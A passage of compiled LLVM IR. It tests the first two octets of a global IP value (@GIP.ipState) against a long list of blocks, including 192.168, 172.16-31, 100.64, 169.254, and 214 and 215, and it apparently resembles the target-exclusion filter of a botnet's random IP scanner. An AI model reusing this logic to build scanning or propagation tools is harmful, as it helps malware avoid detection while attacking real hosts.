  br i1 %93, label %2322, label %94

; <label>:94:                                     ; preds = %90
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 55
  br i1 %97, label %2322, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 214
  br i1 %101, label %2322, label %102

; <label>:102:                                    ; preds = %98
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 215
  br i1 %105, label %2322, label %106

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 192
  br i1 %109, label %110, label %114

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 168
  br i1 %113, label %2322, label %114

; <label>:114:                                    ; preds = %110, %106
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 146
  br i1 %117, label %118, label %122

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 17
  br i1 %121, label %2322, label %122

; <label>:122:                                    ; preds = %118, %114
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 146
  br i1 %125, label %126, label %130

; <label>:126:                                    ; preds = %122
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 80
  br i1 %129, label %2322, label %130

; <label>:130:                                    ; preds = %126, %122
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 146
  br i1 %133, label %134, label %138

; <label>:134:                                    ; preds = %130
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 98
  br i1 %137, label %2322, label %138

; <label>:138:                                    ; preds = %134, %130
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 146
  br i1 %141, label %142, label %146

; <label>:142:                                    ; preds = %138
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 154
  br i1 %145, label %2322, label %146

; <label>:146:                                    ; preds = %142, %138
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 147
  br i1 %149, label %150, label %154

; <label>:150:                                    ; preds = %146
  %151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 159
  br i1 %153, label %2322, label %154

; <label>:154:                                    ; preds = %150, %146
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 148
  br i1 %157, label %158, label %162

; <label>:158:                                    ; preds = %154
  %159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %160 = zext i8 %159 to i32
  %161 = icmp eq i32 %160, 114
  br i1 %161, label %2322, label %162

; <label>:162:                                    ; preds = %158, %154
  %163 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %164 = zext i8 %163 to i32
  %165 = icmp eq i32 %164, 150
  br i1 %165, label %166, label %170

; <label>:166:                                    ; preds = %162
  %167 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %168 = zext i8 %167 to i32
  %169 = icmp eq i32 %168, 125
  br i1 %169, label %2322, label %170

; <label>:170:                                    ; preds = %166, %162
  %171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 150
  br i1 %173, label %174, label %178

; <label>:174:                                    ; preds = %170
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 133
  br i1 %177, label %2322, label %178

; <label>:178:                                    ; preds = %174, %170
  %179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %180 = zext i8 %179 to i32
  %181 = icmp eq i32 %180, 150
  br i1 %181, label %182, label %186

; <label>:182:                                    ; preds = %178
  %183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %184 = zext i8 %183 to i32
  %185 = icmp eq i32 %184, 144
  br i1 %185, label %2322, label %186

; <label>:186:                                    ; preds = %182, %178
  %187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %188 = zext i8 %187 to i32
  %189 = icmp eq i32 %188, 150
  br i1 %189, label %190, label %194

; <label>:190:                                    ; preds = %186
  %191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 149
  br i1 %193, label %2322, label %194

; <label>:194:                                    ; preds = %190, %186
  %195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 %196, 150
  br i1 %197, label %198, label %202

; <label>:198:                                    ; preds = %194
  %199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %200 = zext i8 %199 to i32
  %201 = icmp eq i32 %200, 157
  br i1 %201, label %2322, label %202

; <label>:202:                                    ; preds = %198, %194
  %203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %204 = zext i8 %203 to i32
  %205 = icmp eq i32 %204, 150
  br i1 %205, label %206, label %210

; <label>:206:                                    ; preds = %202
  %207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 184
  br i1 %209, label %2322, label %210

; <label>:210:                                    ; preds = %206, %202
  %211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 150
  br i1 %213, label %214, label %218

; <label>:214:                                    ; preds = %210
  %215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 190
  br i1 %217, label %2322, label %218

; <label>:218:                                    ; preds = %214, %210
  %219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %220 = zext i8 %219 to i32
  %221 = icmp eq i32 %220, 150
  br i1 %221, label %222, label %226

; <label>:222:                                    ; preds = %218
  %223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 196
  br i1 %225, label %2322, label %226

; <label>:226:                                    ; preds = %222, %218
  %227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %228 = zext i8 %227 to i32
  %229 = icmp eq i32 %228, 152
  br i1 %229, label %230, label %234

; <label>:230:                                    ; preds = %226
  %231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %232 = zext i8 %231 to i32
  %233 = icmp eq i32 %232, 82
  br i1 %233, label %2322, label %234

; <label>:234:                                    ; preds = %230, %226
  %235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 152
  br i1 %237, label %238, label %242

; <label>:238:                                    ; preds = %234
  %239 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %240 = zext i8 %239 to i32
  %241 = icmp eq i32 %240, 229
  br i1 %241, label %2322, label %242

; <label>:242:                                    ; preds = %238, %234
  %243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %244 = zext i8 %243 to i32
  %245 = icmp eq i32 %244, 157
  br i1 %245, label %246, label %250

; <label>:246:                                    ; preds = %242
  %247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %248 = zext i8 %247 to i32
  %249 = icmp eq i32 %248, 202
  br i1 %249, label %2322, label %250

; <label>:250:                                    ; preds = %246, %242
  %251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %252 = zext i8 %251 to i32
  %253 = icmp eq i32 %252, 157
  br i1 %253, label %254, label %258

; <label>:254:                                    ; preds = %250
  %255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 217
  br i1 %257, label %2322, label %258

; <label>:258:                                    ; preds = %254, %250
  %259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %260 = zext i8 %259 to i32
  %261 = icmp eq i32 %260, 161
  br i1 %261, label %262, label %266

; <label>:262:                                    ; preds = %258
  %263 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %264 = zext i8 %263 to i32
  %265 = icmp eq i32 %264, 124
  br i1 %265, label %2322, label %266

; <label>:266:                                    ; preds = %262, %258
  %267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %268 = zext i8 %267 to i32
  %269 = icmp eq i32 %268, 162
  br i1 %269, label %270, label %274

; <label>:270:                                    ; preds = %266
  %271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %272 = zext i8 %271 to i32
  %273 = icmp eq i32 %272, 32
  br i1 %273, label %2322, label %274

; <label>:274:                                    ; preds = %270, %266
  %275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %276 = zext i8 %275 to i32
  %277 = icmp eq i32 %276, 155
  br i1 %277, label %278, label %282

; <label>:278:                                    ; preds = %274
  %279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 96
  br i1 %281, label %2322, label %282

; <label>:282:                                    ; preds = %278, %274
  %283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %284 = zext i8 %283 to i32
  %285 = icmp eq i32 %284, 155
  br i1 %285, label %286, label %290

; <label>:286:                                    ; preds = %282
  %287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %288 = zext i8 %287 to i32
  %289 = icmp eq i32 %288, 149
  br i1 %289, label %2322, label %290

; <label>:290:                                    ; preds = %286, %282
  %291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %292 = zext i8 %291 to i32
  %293 = icmp eq i32 %292, 155
  br i1 %293, label %294, label %298

; <label>:294:                                    ; preds = %290
  %295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 155
  br i1 %297, label %2322, label %298

; <label>:298:                                    ; preds = %294, %290
  %299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 155
  br i1 %301, label %302, label %306

; <label>:302:                                    ; preds = %298
  %303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %304 = zext i8 %303 to i32
  %305 = icmp eq i32 %304, 178
  br i1 %305, label %2322, label %306

; <label>:306:                                    ; preds = %302, %298
  %307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %308 = zext i8 %307 to i32
  %309 = icmp eq i32 %308, 164
  br i1 %309, label %310, label %314

; <label>:310:                                    ; preds = %306
  %311 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %312 = zext i8 %311 to i32
  %313 = icmp eq i32 %312, 158
  br i1 %313, label %2322, label %314

; <label>:314:                                    ; preds = %310, %306
  %315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %316 = zext i8 %315 to i32
  %317 = icmp eq i32 %316, 156
  br i1 %317, label %318, label %322

; <label>:318:                                    ; preds = %314
  %319 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %320 = zext i8 %319 to i32
  %321 = icmp eq i32 %320, 9
  br i1 %321, label %2322, label %322

; <label>:322:                                    ; preds = %318, %314
  %323 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %324 = zext i8 %323 to i32
  %325 = icmp eq i32 %324, 167
  br i1 %325, label %326, label %330

; <label>:326:                                    ; preds = %322
  %327 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %328 = zext i8 %327 to i32
  %329 = icmp eq i32 %328, 44
  br i1 %329, label %2322, label %330

; <label>:330:                                    ; preds = %326, %322
  %331 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %332 = zext i8 %331 to i32
  %333 = icmp eq i32 %332, 168
  br i1 %333, label %334, label %338

; <label>:334:                                    ; preds = %330
  %335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %336 = zext i8 %335 to i32
  %337 = icmp eq i32 %336, 68
  br i1 %337, label %2322, label %338

; <label>:338:                                    ; preds = %334, %330
  %339 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %340 = zext i8 %339 to i32
  %341 = icmp eq i32 %340, 168
  br i1 %341, label %342, label %346

; <label>:342:                                    ; preds = %338
  %343 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %344 = zext i8 %343 to i32
  %345 = icmp eq i32 %344, 85
  br i1 %345, label %2322, label %346

; <label>:346:                                    ; preds = %342, %338
  %347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %348 = zext i8 %347 to i32
  %349 = icmp eq i32 %348, 168
  br i1 %349, label %350, label %354

; <label>:350:                                    ; preds = %346
  %351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %352 = zext i8 %351 to i32
  %353 = icmp eq i32 %352, 102
  br i1 %353, label %2322, label %354

; <label>:354:                                    ; preds = %350, %346
  %355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %356 = zext i8 %355 to i32
  %357 = icmp eq i32 %356, 203
  br i1 %357, label %358, label %362

; <label>:358:                                    ; preds = %354
  %359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %360 = zext i8 %359 to i32
  %361 = icmp eq i32 %360, 59
  br i1 %361, label %2322, label %362

; <label>:362:                                    ; preds = %358, %354
  %363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %364 = zext i8 %363 to i32
  %365 = icmp eq i32 %364, 204
  br i1 %365, label %366, label %370

; <label>:366:                                    ; preds = %362
  %367 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %368 = zext i8 %367 to i32
  %369 = icmp eq i32 %368, 34
  br i1 %369, label %2322, label %370

; <label>:370:                                    ; preds = %366, %362
  %371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %372 = zext i8 %371 to i32
  %373 = icmp eq i32 %372, 207
  br i1 %373, label %374, label %378

; <label>:374:                                    ; preds = %370
  %375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %376 = zext i8 %375 to i32
  %377 = icmp eq i32 %376, 30
  br i1 %377, label %2322, label %378

; <label>:378:                                    ; preds = %374, %370
  %379 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %380 = zext i8 %379 to i32
  %381 = icmp eq i32 %380, 117
  br i1 %381, label %382, label %386

; <label>:382:                                    ; preds = %378
  %383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %384 = zext i8 %383 to i32
  %385 = icmp eq i32 %384, 55
  br i1 %385, label %2322, label %386

; <label>:386:                                    ; preds = %382, %378
  %387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %388 = zext i8 %387 to i32
  %389 = icmp eq i32 %388, 117
  br i1 %389, label %390, label %394

; <label>:390:                                    ; preds = %386
  %391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %392 = zext i8 %391 to i32
  %393 = icmp eq i32 %392, 56
  br i1 %393, label %2322, label %394

; <label>:394:                                    ; preds = %390, %386
  %395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %396 = zext i8 %395 to i32
  %397 = icmp eq i32 %396, 80
  br i1 %397, label %398, label %402

; <label>:398:                                    ; preds = %394
  %399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %400 = zext i8 %399 to i32
  %401 = icmp eq i32 %400, 235
  br i1 %401, label %2322, label %402

; <label>:402:                                    ; preds = %398, %394
  %403 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %404 = zext i8 %403 to i32
  %405 = icmp eq i32 %404, 207
  br i1 %405, label %406, label %410

; <label>:406:                                    ; preds = %402
  %407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %408 = zext i8 %407 to i32
  %409 = icmp eq i32 %408, 120
  br i1 %409, label %2322, label %410

; <label>:410:                                    ; preds = %406, %402
  %411 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %412 = zext i8 %411 to i32
  %413 = icmp eq i32 %412, 209
  br i1 %413, label %414, label %418

; <label>:414:                                    ; preds = %410
  %415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %416 = zext i8 %415 to i32
  %417 = icmp eq i32 %416, 35
  br i1 %417, label %2322, label %418

; <label>:418:                                    ; preds = %414, %410
  %419 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %420 = zext i8 %419 to i32
  %421 = icmp eq i32 %420, 64
  br i1 %421, label %422, label %426

; <label>:422:                                    ; preds = %418
  %423 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %424 = zext i8 %423 to i32
  %425 = icmp eq i32 %424, 70
  br i1 %425, label %2322, label %426

; <label>:426:                                    ; preds = %422, %418
  %427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %428 = zext i8 %427 to i32
  %429 = icmp eq i32 %428, 172
  br i1 %429, label %430, label %438

; <label>:430:                                    ; preds = %426
  %431 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %432 = zext i8 %431 to i32
  %433 = icmp sge i32 %432, 16
  br i1 %433, label %434, label %438

; <label>:434:                                    ; preds = %430
  %435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %436 = zext i8 %435 to i32
  %437 = icmp slt i32 %436, 32
  br i1 %437, label %2322, label %438

; <label>:438:                                    ; preds = %434, %430, %426
  %439 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %440 = zext i8 %439 to i32
  %441 = icmp eq i32 %440, 100
  br i1 %441, label %442, label %450

; <label>:442:                                    ; preds = %438
  %443 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %444 = zext i8 %443 to i32
  %445 = icmp sge i32 %444, 64
  br i1 %445, label %446, label %450

; <label>:446:                                    ; preds = %442
  %447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %448 = zext i8 %447 to i32
  %449 = icmp slt i32 %448, 127
  br i1 %449, label %2322, label %450

; <label>:450:                                    ; preds = %446, %442, %438
  %451 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %452 = zext i8 %451 to i32
  %453 = icmp eq i32 %452, 169
  br i1 %453, label %454, label %458

; <label>:454:                                    ; preds = %450
  %455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %456 = zext i8 %455 to i32
  %457 = icmp eq i32 %456, 254
  br i1 %457, label %2322, label %458

; <label>:458:                                    ; preds = %454, %450
  %459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %460 = zext i8 %459 to i32
  %461 = icmp eq i32 %460, 198
  br i1 %461, label %462, label %470

; <label>:462:                                    ; preds = %458
  %463 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %464 = zext i8 %463 to i32
  %465 = icmp sge i32 %464, 18
  br i1 %465, label %466, label %470

; <label>:466:                                    ; preds = %462
  %467 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %468 = zext i8 %467 to i32
  %469 = icmp slt i32 %468, 20
  br i1 %469, label %2322, label %470

; <label>:470:                                    ; preds = %466, %462, %458
  %471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %472 = zext i8 %471 to i32
  %473 = icmp eq i32 %472, 64
  br i1 %473, label %474, label %482

; <label>:474:                                    ; preds = %470
  %475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %476 = zext i8 %475 to i32
  %477 = icmp sge i32 %476, 69
  br i1 %477, label %478, label %482

; <label>:478:                                    ; preds = %474
  %479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %480 = zext i8 %479 to i32
  %481 = icmp slt i32 %480, 227
  br i1 %481, label %2322, label %482

; <label>:482:                                    ; preds = %478, %474, %470
  %483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %484 = zext i8 %483 to i32
  %485 = icmp eq i32 %484, 128
  br i1 %485, label %486, label %494

; <label>:486:                                    ; preds = %482
  %487 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %488 = zext i8 %487 to i32
  %489 = icmp sge i32 %488, 35
  br i1 %489, label %490, label %494

; <label>:490:                                    ; preds = %486
  %491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %492 = zext i8 %491 to i32
  %493 = icmp slt i32 %492, 237
  br i1 %493, label %2322, label %494

; <label>:494:                                    ; preds = %490, %486, %482
  %495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %496 = zext i8 %495 to i32
  %497 = icmp eq i32 %496, 129
  br i1 %497, label %498, label %506

; <label>:498:                                    ; preds = %494
  %499 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %500 = zext i8 %499 to i32
  %501 = icmp sge i32 %500, 22
  br i1 %501, label %502, label %506

; <label>:502:                                    ; preds = %498
  %503 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %504 = zext i8 %503 to i32
  %505 = icmp slt i32 %504, 255
  br i1 %505, label %2322, label %506

; <label>:506:                                    ; preds = %502, %498, %494
  %507 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %508 = zext i8 %507 to i32
  %509 = icmp eq i32 %508, 130
  br i1 %509, label %510, label %518

; <label>:510:                                    ; preds = %506
  %511 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %512 = zext i8 %511 to i32
  %513 = icmp sge i32 %512, 40
  br i1 %513, label %514, label %518

; <label>:514:                                    ; preds = %510
  %515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %516 = zext i8 %515 to i32
  %517 = icmp slt i32 %516, 168
  br i1 %517, label %2322, label %518

; <label>:518:                                    ; preds = %514, %510, %506
  %519 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %520 = zext i8 %519 to i32
  %521 = icmp eq i32 %520, 131
  br i1 %521, label %522, label %530

; <label>:522:                                    ; preds = %518
  %523 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %524 = zext i8 %523 to i32
  %525 = icmp sge i32 %524, 3
  br i1 %525, label %526, label %530

; <label>:526:                                    ; preds = %522
  %527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %528 = zext i8 %527 to i32
  %529 = icmp slt i32 %528, 251
  br i1 %529, label %2322, label %530

; <label>:530:                                    ; preds = %526, %522, %518
  %531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %532 = zext i8 %531 to i32
  %533 = icmp eq i32 %532, 132
  br i1 %533, label %534, label %542

; <label>:534:                                    ; preds = %530
  %535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %536 = zext i8 %535 to i32
  %537 = icmp sge i32 %536, 3
  br i1 %537, label %538, label %542

; <label>:538:                                    ; preds = %534
  %539 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %540 = zext i8 %539 to i32
  %541 = icmp slt i32 %540, 251
  br i1 %541, label %2322, label %542

; <label>:542:                                    ; preds = %538, %534, %530
  %543 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %544 = zext i8 %543 to i32
  %545 = icmp eq i32 %544, 134
  br i1 %545, label %546, label %554

; <label>:546:                                    ; preds = %542
